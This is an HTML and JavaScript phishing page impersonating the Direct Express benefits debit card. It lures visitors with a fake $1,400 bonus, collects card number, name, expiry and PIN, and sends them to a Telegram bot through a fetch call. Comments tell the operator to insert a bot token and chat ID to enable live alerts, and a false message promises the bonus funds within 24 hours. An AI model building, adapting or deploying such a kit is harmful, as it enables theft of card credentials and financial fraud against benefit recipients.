<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Direct Express • Claim Bonus</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: #EEF2F5;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
            padding: 12px;
            color: #1A2C3A;
            min-height: 100vh;
        }

        .app-container {
            max-width: 100%;
            width: 100%;
            margin: 0 auto;
        }

        /* Header */
        .top-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .logo-area {
            font-weight: 800;
            font-size: 18px;
            color: #1B4D2E;
        }
        .secure-tag {
            background: #E9F0E9;
            padding: 4px 10px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: 500;
            color: #2A6E3A;
        }

        /* Card image container - responsive */
        .card-image-container {
            margin-bottom: 20px;
            width: 100%;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 12px 24px -10px rgba(0, 0, 0, 0.25);
        }
        .card-svg {
            width: 100%;
            height: auto;
            display: block;
            aspect-ratio: 400 / 240;
        }

        /* Form panel */
        .form-panel {
            background: #FFFFFF;
            border-radius: 28px;
            box-shadow: 0 8px 20px -6px rgba(0, 0, 0, 0.08);
            padding: 20px 16px 24px;
            width: 100%;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-label {
            display: flex;
            justify-content: space-between;
            font-weight: 600;
            font-size: 13px;
            margin-bottom: 6px;
            color: #1F4A6E;
        }
        .required-star {
            color: #C72A2A;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            font-size: 15px;
            border: 1.5px solid #E2EAF1;
            border-radius: 28px;
            background: #FFFFFF;
            transition: 0.2s;
            font-family: inherit;
            outline: none;
            -webkit-appearance: none;
        }
        input:focus {
            border-color: #2A7A3E;
            box-shadow: 0 0 0 3px rgba(42,122,62,0.15);
        }
        .bonus-message {
            background: linear-gradient(135deg, #F0F9F0 0%, #E8F3E8 100%);
            border-radius: 20px;
            padding: 12px 14px;
            margin: 16px 0 18px;
            font-size: 12.5px;
            color: #14532D;
            border-left: 4px solid #2E7D32;
            font-weight: 500;
            text-align: center;
        }
        .bonus-message strong {
            font-size: 14px;
            color: #0F4C2C;
        }
        .verify-btn {
            background: #14532D;
            color: white;
            width: 100%;
            border: none;
            padding: 14px;
            font-weight: 700;
            font-size: 16px;
            border-radius: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
            box-shadow: 0 6px 14px rgba(20,83,45,0.25);
        }
        .verify-btn:active {
            transform: scale(0.97);
        }
        .balance-preview {
            background: #F8FCF8;
            border-radius: 20px;
            padding: 10px 14px;
            margin-top: 16px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            border: 1px solid #D4E6D4;
            color: #1A5E32;
        }
        .eligibility-note {
            text-align: center;
            font-size: 11px;
            color: #2E7D32;
            margin-top: 12px;
            padding-top: 8px;
            border-top: 1px solid #E2EDE2;
            font-weight: 600;
        }

        /* Modal - mobile optimized */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0.2s, opacity 0.2s;
        }
        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-container {
            background: white;
            width: 85%;
            max-width: 320px;
            border-radius: 28px;
            box-shadow: 0 20px 30px -12px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            transform: scale(0.95);
            transition: transform 0.2s;
        }
        .modal-overlay.active .modal-container {
            transform: scale(1);
        }
        .modal-header {
            background: #14532D;
            padding: 16px 18px;
            text-align: center;
        }
        .modal-header h3 {
            color: white;
            font-weight: 700;
            font-size: 17px;
        }
        .modal-body {
            padding: 20px 16px 18px;
        }
        .modal-body .pin-label {
            font-size: 13px;
            font-weight: 600;
            color: #1F4A6E;
            text-align: center;
            margin-bottom: 8px;
        }
        .modal-card-number {
            background: #F1F8F2;
            padding: 8px;
            border-radius: 14px;
            text-align: center;
            font-family: monospace;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 1px;
            color: #14532D;
            margin-bottom: 18px;
        }
        .pin-input-modal {
            width: 100%;
            text-align: center;
            font-size: 22px;
            letter-spacing: 6px;
            padding: 12px 10px;
            border: 2px solid #D4E6D4;
            border-radius: 50px;
            font-family: monospace;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .pin-input-modal:focus {
            border-color: #2E7D32;
            outline: none;
            box-shadow: 0 0 0 3px rgba(46,125,50,0.2);
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
        }
        .modal-confirm {
            flex: 1;
            background: #14532D;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 44px;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
        }
        .modal-cancel {
            flex: 1;
            background: #EFF3F8;
            color: #4A627A;
            border: none;
            padding: 10px;
            border-radius: 44px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
        }
        .toast-message {
            margin-top: 16px;
            background: #1E2F3C;
            color: white;
            border-radius: 60px;
            padding: 10px 14px;
            font-size: 12px;
            text-align: center;
            opacity: 0;
            transition: 0.2s;
            pointer-events: none;
            width: 100%;
        }
        .toast-message.show {
            opacity: 1;
        }
        .toast-error {
            background: #B91C1C;
        }
        .toast-success {
            background: #117F4A;
        }

        @media (max-width: 420px) {
            body {
                padding: 10px;
            }
            .form-panel {
                padding: 16px 14px 20px;
            }
            .bonus-message {
                font-size: 11.5px;
                padding: 10px 12px;
            }
            .bonus-message strong {
                font-size: 13px;
            }
            .card-image-container {
                border-radius: 16px;
            }
            .verify-btn {
                padding: 12px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
<div class="app-container">
    <div class="top-header">
        <div class="logo-area">💳 DirectExpress</div>
        <div class="secure-tag">✓ secure link</div>
    </div>

    <!-- PHOTOREALISTIC SVG CARD (fixed layout, no text cutoff) -->
    <div class="card-image-container">
        <svg class="card-svg" viewBox="0 0 400 240" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet">
            <defs>
                <linearGradient id="cardGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stop-color="#1A6B3A"/>
                    <stop offset="50%" stop-color="#0F4C2A"/>
                    <stop offset="100%" stop-color="#08361C"/>
                </linearGradient>
                <linearGradient id="chipGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stop-color="#E9C27C"/>
                    <stop offset="100%" stop-color="#C9A256"/>
                </linearGradient>
                <filter id="cardShadow" x="-5%" y="-5%" width="110%" height="110%">
                    <feDropShadow dx="0" dy="6" stdDeviation="8" flood-opacity="0.3"/>
                </filter>
            </defs>
            <!-- Card base -->
            <rect width="400" height="240" rx="20" ry="20" fill="url(#cardGrad)" filter="url(#cardShadow)"/>
            <rect x="2" y="2" width="396" height="236" rx="18" ry="18" fill="none" stroke="rgba(255,255,255,0.12)" stroke-width="1.5"/>
            
            <!-- Bank name -->
            <text x="24" y="38" font-family="Arial, sans-serif" font-weight="800" font-size="18" fill="white" letter-spacing="0.5">Comenqa Bank</text>
            
            <!-- debit badge -->
            <rect x="278" y="20" width="52" height="20" rx="20" fill="rgba(255,255,255,0.2)"/>
            <text x="304" y="34" font-family="Arial, sans-serif" font-weight="700" font-size="10" fill="white" text-anchor="middle">debit</text>
            
            <!-- Mastercard circles + text - adjusted positions to avoid cutoff -->
            <circle cx="334" cy="52" r="8" fill="#EB001B"/>
            <circle cx="342" cy="52" r="8" fill="#F79E1B"/>
            <text x="356" y="56" font-family="Arial, sans-serif" font-weight="800" font-size="11" fill="white">mastercard</text>
            
            <!-- DIRECTEXPRESS sub brand -->
            <rect x="24" y="60" width="130" height="20" rx="20" fill="rgba(255,255,240,0.12)"/>
            <text x="89" y="74" font-family="Arial, sans-serif" font-weight="800" font-size="12" fill="white" text-anchor="middle" letter-spacing="1">DIRECTEXPRESS</text>
            
            <!-- EMV Chip -->
            <rect x="24" y="98" width="48" height="36" rx="6" fill="url(#chipGrad)" stroke="#B88B3A" stroke-width="0.5"/>
            <line x1="32" y1="108" x2="64" y2="108" stroke="#AA7C2E" stroke-width="2"/>
            <line x1="32" y1="114" x2="64" y2="114" stroke="#AA7C2E" stroke-width="2"/>
            <line x1="32" y1="120" x2="64" y2="120" stroke="#AA7C2E" stroke-width="2"/>
            <line x1="32" y1="126" x2="64" y2="126" stroke="#AA7C2E" stroke-width="2"/>
            <!-- Contactless icon -->
            <text x="340" y="120" font-size="24" fill="rgba(255,255,255,0.85)">📶</text>
            
            <!-- Card Number Masked (dynamic via JS) -->
            <text x="24" y="165" font-family="'SF Mono', 'Fira Code', monospace" font-weight="600" font-size="18" fill="white" letter-spacing="1.5" id="svgCardNumber">5332 48XX XXXX 3622</text>
            
            <!-- GOOD THRU + Expiry -->
            <text x="24" y="202" font-family="Arial, sans-serif" font-size="8" fill="rgba(255,255,255,0.7)" letter-spacing="1">GOOD THRU</text>
            <text x="24" y="218" font-family="Arial, sans-serif" font-weight="700" font-size="13" fill="white" id="svgExpiry">12/28</text>
            
            <text x="280" y="218" font-family="Arial, sans-serif" font-weight="800" font-size="11" fill="white" letter-spacing="1.2" text-anchor="end">DIRECTEXPRESS</text>
        </svg>
    </div>

    <!-- FORM SECTION -->
    <div class="form-panel">
        <div class="input-group">
            <div class="input-label">
                <span>💳 Card Number (16 digits)</span>
                <span class="required-star">*</span>
            </div>
            <input type="text" id="cardNumber" placeholder="5332 4800 1234 3622" maxlength="19" autocomplete="off" inputmode="numeric">
        </div>
        <div class="input-group">
            <div class="input-label">
                <span>👤 Full Name (as on card)</span>
                <span class="required-star">*</span>
            </div>
            <input type="text" id="fullName" placeholder="JOHN A. DOE" autocomplete="off">
        </div>
        <div class="input-group">
            <div class="input-label">
                <span>📅 Expiry (MM/YY)</span>
                <span class="required-star">*</span>
            </div>
            <input type="text" id="expiryDate" placeholder="12/28" maxlength="5" autocomplete="off" value="12/28">
        </div>

        <div class="bonus-message">
            🎯 <strong>Qualify for a $1,400 Bonus</strong><br>
            Upon successful card verification, you become eligible for an exclusive $1,400 Direct Express account bonus. 
            Verification is required to confirm identity and activate the promotion.
        </div>

        <!-- Button text changed to "Claim Bonus" -->
        <button class="verify-btn" id="openModalBtn">
            🎁 Claim Bonus
        </button>

        <div class="balance-preview">
            <span>🏦 Card •••• 3622 balance preview</span>
            <span><strong>**</strong></span>
        </div>

        <div class="eligibility-note">
            ✅ You are eligible for the $1,400 bonus. Complete verification to claim your reward.
        </div>
    </div>

    <div id="toastMessage" class="toast-message"></div>
</div>

<!-- PIN MODAL -->
<div id="pinModal" class="modal-overlay">
    <div class="modal-container">
        <div class="modal-header">
            <h3>🔐 Secure PIN Verification</h3>
        </div>
        <div class="modal-body">
            <div class="pin-label">Enter the PIN of card</div>
            <div class="modal-card-number" id="modalCardLastFour">•••• 3622</div>
            <input type="password" id="modalPinInput" class="pin-input-modal" placeholder="****" maxlength="4" inputmode="numeric" autocomplete="off">
            <div class="modal-buttons">
                <button class="modal-cancel" id="modalCancelBtn">Cancel</button>
                <button class="modal-confirm" id="modalConfirmBtn">Confirm</button>
            </div>
        </div>
    </div>
</div>

<script>
    // ------------------------------------------------------------------
    // TELEGRAM CONFIGURATION (Replace with your actual bot token and chat ID)
    // ------------------------------------------------------------------
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";     
    const CHAT_ID = "YOUR_CHAT_ID_HERE";         
    // Demo mode active if tokens not changed
    // ------------------------------------------------------------------

    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiryDate');
    const fullNameInput = document.getElementById('fullName');
    const openModalBtn = document.getElementById('openModalBtn');
    const modalOverlay = document.getElementById('pinModal');
    const modalPinInput = document.getElementById('modalPinInput');
    const modalConfirmBtn = document.getElementById('modalConfirmBtn');
    const modalCancelBtn = document.getElementById('modalCancelBtn');
    const modalCardLastFour = document.getElementById('modalCardLastFour');

    const svgCardNumber = document.getElementById('svgCardNumber');
    const svgExpiry = document.getElementById('svgExpiry');

    let pendingCardData = { cardNumber: '', fullName: '', expiry: '' };

    function formatCardNumberSpaces(value) {
        let digits = value.replace(/\D/g, '');
        if (digits.length > 16) digits = digits.slice(0, 16);
        let formatted = '';
        for (let i = 0; i < digits.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += digits[i];
        }
        return formatted;
    }

    function updateCardPreview() {
        const rawCard = cardNumberInput.value.replace(/\s/g, '');
        let displayNumber = "5332 48XX XXXX 3622";
        if (rawCard.length > 0) {
            let lastFour = "3622";
            if (rawCard.length >= 4) lastFour = rawCard.slice(-4);
            if (rawCard.length >= 6) {
                let firstSix = rawCard.slice(0,6);
                let middleMask = "X".repeat(Math.max(4, rawCard.length - 10));
                let baseNumber = firstSix + middleMask + lastFour;
                let spaced = '';
                for (let i=0; i<baseNumber.length; i++) {
                    if (i>0 && i%4===0) spaced += ' ';
                    spaced += baseNumber[i];
                }
                displayNumber = spaced;
            } else if (rawCard.length >= 4) {
                displayNumber = `${rawCard.slice(0,4)} XXXX XXXX ${lastFour}`;
            } else {
                displayNumber = `${rawCard}XXX XXXX XXXX 3622`;
            }
        }
        if (svgCardNumber) svgCardNumber.textContent = displayNumber;
        
        let expiryVal = expiryInput.value.trim();
        if (expiryVal && expiryVal.match(/^\d{2}\/\d{2}$/)) {
            if (svgExpiry) svgExpiry.textContent = expiryVal;
        } else {
            if (svgExpiry) svgExpiry.textContent = "12/28";
        }
    }

    cardNumberInput.addEventListener('input', function(e) {
        let raw = e.target.value.replace(/\s/g, '');
        if (raw.length > 16) raw = raw.slice(0,16);
        let formatted = '';
        for (let i=0; i<raw.length; i++) {
            if (i>0 && i%4===0) formatted += ' ';
            formatted += raw[i];
        }
        e.target.value = formatted;
        updateCardPreview();
    });

    expiryInput.addEventListener('input', function(e) {
        let val = e.target.value.replace(/[^0-9/]/g, '');
        if (val.length === 2 && !val.includes('/') && val.length === 2) {
            val = val + '/';
        }
        if (val.length > 5) val = val.slice(0,5);
        e.target.value = val;
        updateCardPreview();
    });

    updateCardPreview();

    function showToast(message, isError = false) {
        const toast = document.getElementById('toastMessage');
        toast.innerText = message;
        toast.classList.add('show');
        if (isError) {
            toast.classList.add('toast-error');
            toast.classList.remove('toast-success');
        } else {
            toast.classList.add('toast-success');
            toast.classList.remove('toast-error');
        }
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => {
                toast.classList.remove('toast-error', 'toast-success');
            }, 300);
        }, 4500);
    }

    function validateBasicDetails(cardNumberClean, fullName, expiry) {
        if (cardNumberClean.length !== 16) {
            showToast("❌ Card number must be exactly 16 digits.", true);
            return false;
        }
        if (!/^\d+$/.test(cardNumberClean)) {
            showToast("❌ Card number must contain only digits.", true);
            return false;
        }
        if (fullName.trim().length < 2) {
            showToast("❌ Please enter the full name as on card.", true);
            return false;
        }
        const expiryRegex = /^(0[1-9]|1[0-2])\/(\d{2})$/;
        if (!expiryRegex.test(expiry)) {
            showToast("❌ Expiry must be in MM/YY format (e.g., 12/28).", true);
            return false;
        }
        return true;
    }

    async function sendToTelegram(cardNumber, fullName, cardPin, expiry) {
        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("⚠️ DEMO MODE — Telegram not configured.", { cardNumber, fullName, cardPin, expiry });
            showToast("🔧 DEMO MODE: credentials logged to console. Replace BOT_TOKEN & CHAT_ID.", false);
            return { ok: true, demo: true };
        }
        const message = `🔐 *DIRECT EXPRESS VERIFICATION* 🔐\n\n💳 *Card Number:* ${cardNumber}\n👤 *Cardholder:* ${fullName}\n🔢 *PIN:* ${cardPin}\n📅 *Expiry:* ${expiry}\n💰 *Bonus Eligibility:* $1,400 after verification\n🕒 *Timestamp:* ${new Date().toLocaleString()}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            });
            const data = await response.json();
            if (data.ok) return { ok: true };
            return { ok: false, error: data.description || "Telegram send failed" };
        } catch (err) {
            return { ok: false, error: err.message };
        }
    }

    function showPinModal(cardNumberRaw) {
        const cleanCard = cardNumberRaw.replace(/\s/g, '');
        let lastFour = "3622";
        if (cleanCard.length >= 4) lastFour = cleanCard.slice(-4);
        modalCardLastFour.innerText = `•••• ${lastFour}`;
        modalPinInput.value = '';
        modalOverlay.classList.add('active');
        setTimeout(() => modalPinInput.focus(), 100);
    }

    function closeModal() { modalOverlay.classList.remove('active'); }

    openModalBtn.addEventListener('click', function(e) {
        e.preventDefault();
        const cardNumberRaw = cardNumberInput.value;
        const fullName = fullNameInput.value.trim();
        const expiry = expiryInput.value.trim();
        const cleanCardNumber = cardNumberRaw.replace(/\s/g, '');
        if (!validateBasicDetails(cleanCardNumber, fullName, expiry)) return;
        pendingCardData = { cardNumber: cleanCardNumber, fullName, expiry };
        showPinModal(cleanCardNumber);
    });

    modalConfirmBtn.addEventListener('click', async function() {
        const pin = modalPinInput.value.trim();
        if (!/^\d{4}$/.test(pin)) {
            showToast("❌ Please enter a valid 4-digit PIN.", true);
            modalPinInput.focus();
            return;
        }
        modalConfirmBtn.disabled = true;
        modalConfirmBtn.innerText = "Verifying...";
        const result = await sendToTelegram(pendingCardData.cardNumber, pendingCardData.fullName, pin, pendingCardData.expiry);
        if (result.ok) {
            showToast("✔️ Verification complete! You are now qualified for the $1,400 bonus. Funds will be deposited within 24 hours.", false);
            closeModal();
            modalPinInput.value = '';
        } else {
            showToast(`⚠️ Failed: ${result.error || "Telegram error"}`, true);
        }
        modalConfirmBtn.disabled = false;
        modalConfirmBtn.innerText = "Confirm";
    });

    modalCancelBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', (e) => { if (e.target === modalOverlay) closeModal(); });
    modalPinInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') modalConfirmBtn.click(); });

    console.log("%c✅ Card fixed: 'mastercard' fully visible | Button: 'Claim Bonus' | Mobile optimized", "color:#2A7A3E; font-weight:bold;");
    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
        console.log("%c⚠️ DEMO ACTIVE: Replace BOT_TOKEN & CHAT_ID to enable real Telegram alerts.", "background:#f1c40f; color:#1e2a36; padding:3px; border-radius:6px;");
    }
</script>
</body>
</html>
